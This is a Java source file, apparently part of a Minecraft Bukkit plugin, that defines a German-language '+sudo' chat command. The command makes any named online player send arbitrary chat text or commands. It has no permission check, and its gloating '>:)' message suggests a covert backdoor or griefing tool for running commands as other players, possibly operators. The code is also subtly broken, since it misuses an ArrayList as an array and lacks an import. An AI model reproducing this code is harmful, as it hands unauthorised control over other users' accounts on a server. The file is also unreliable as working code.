package de.Garkolym.Commands.Server;

import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.entity.Player;

import de.Garkolym.Start;
import de.Garkolym.Commands.Command;
import de.Garkolym.Commands.CommandCategory;

public class CommandSUDO extends Command {

	public CommandSUDO() {
		super("sudo", CommandCategory.SERVER);
	}

	@Override
	public void onCommand(Player p, ArrayList<String> args) {
		if(args.length > 2) {
			try {
				Player p1 = Bukkit.getPlayer(args[1]);
				String Command = "";
				char char1 = '"';
				for(int i = 2;i < args.length;i++){
					Command = Command + args[i] + " ";
				}
				p1.chat(Command);
				p.sendMessage(Start.instance.prefix + ChatColor.GREEN + "Der Command " + char1 + Command + char1 + " wurde versand >:)!");
			}catch(Exception e) {
				p.sendMessage(Start.instance.prefix + ChatColor.RED + "Dieser Spieler ist nicht online!");
			}
		}
		if(args.length < 2) {
			p.sendMessage(Start.instance.prefix + ChatColor.RED + "Nutze +sudo <Spieler> <Command/Nachricht>");
		}
		if(args.length == 2) {
			p.sendMessage(Start.instance.prefix + ChatColor.RED + "Nutze +sudo <Spieler> <Command/Nachricht>");
		}
	}
}
